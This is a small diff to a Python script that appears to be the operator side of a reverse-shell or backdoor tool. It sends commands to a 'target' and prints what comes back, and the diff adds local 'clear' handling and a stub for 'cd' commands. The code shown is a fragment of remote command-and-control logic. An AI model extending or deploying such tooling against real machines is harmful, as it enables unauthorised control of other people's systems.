@@ -1,3 +1,4 @@
+import os
 import socket
 import json
 
@@ -21,6 +22,10 @@ def target_comm():
         reliable_send(cmd)
         if cmd == 'exit':
             break
+        elif cmd == 'clear':
+            os.system('clear')
+        elif cmd[:3] =='cd ': #directory changing checking for first 3 characters
+            pass
         else:
             result = reliable_recv()
             print(result)
